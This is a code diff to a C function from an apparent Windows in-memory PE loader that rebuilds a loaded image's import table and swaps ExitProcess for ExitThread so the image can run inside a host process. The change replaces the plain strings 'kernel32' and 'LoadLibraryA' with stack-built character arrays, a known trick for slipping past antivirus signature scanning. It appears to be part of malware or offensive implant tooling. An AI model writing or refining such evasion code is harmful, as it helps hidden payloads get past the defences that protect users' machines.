@@ -89,6 +89,9 @@ typedef HMODULE (WINAPI *LoadLibraryA_p)(LPCSTR strDllName);
 
 void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader)
 {
+	CHAR strKernel32A[] = {'k', 'e', 'r', 'n', 'e', 'l', '3', '2', 0x0};
+	WCHAR strKernel32[] = {L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'\0'};
+	CHAR strLoadLibrary[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x0 };
 	DWORD dwIatSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
 	DWORD dwIatAddr = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
 	
@@ -109,7 +112,7 @@ void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader)
 		LPDWORD pImportLookupTable = CALC_OFFSET(LPDWORD, pModule, pImportDescriptor->FirstThunk);
 		LPCSTR lpModName = CALC_OFFSET(LPCSTR, pModule, pImportDescriptor->Name);
 
-		LoadLibraryA_p fpLoadLibraryA = (LoadLibraryA_p) GetProcAddress(LoadLibrary(L"kernel32"), "LoadLibraryA");
+		LoadLibraryA_p fpLoadLibraryA = (LoadLibraryA_p) GetProcAddress(LoadLibrary(strKernel32), strLoadLibrary);
 		HMODULE hMod = fpLoadLibraryA(lpModName);
 		//HMODULE hMod = LoadLibraryA(lpModName);
 		
@@ -121,7 +124,7 @@ void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader)
 					DWORD pOrdinalValue = *(CALC_OFFSET(LPDWORD, pImportLookupTable, 0)) & 0x0000ffff;
 					*pImportLookupTable = (DWORD) GetProcAddress(hMod, (LPCSTR) pOrdinalValue);
 					// SOSTITUISCE EXITPROCESS CON EXITTHREAD 
-					if (*pImportLookupTable == (DWORD)GetProcAddress(fpLoadLibraryA("kernel32"), "ExitProcess"))
+					if (*pImportLookupTable == (DWORD)GetProcAddress(fpLoadLibraryA(strKernel32A), "ExitProcess"))
 						*pImportLookupTable = (DWORD)ExitThread;
 				}
 				else
@@ -129,7 +132,7 @@ void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader)
 					LPCSTR lpProcName = CALC_OFFSET_DISP(LPCSTR, pModule, (*pImportLookupTable), 2);	// adding two bytes
 					*pImportLookupTable = (DWORD) GetProcAddress(hMod, lpProcName);
 					// SOSTITUISCE EXITPROCESS CON EXITTHREAD
-					if (*pImportLookupTable == (DWORD)GetProcAddress(fpLoadLibraryA("kernel32"), "ExitProcess"))
+					if (*pImportLookupTable == (DWORD)GetProcAddress(fpLoadLibraryA(strKernel32A), "ExitProcess"))
 						*pImportLookupTable = (DWORD)ExitThread;
 				}
 				pImportLookupTable++;		
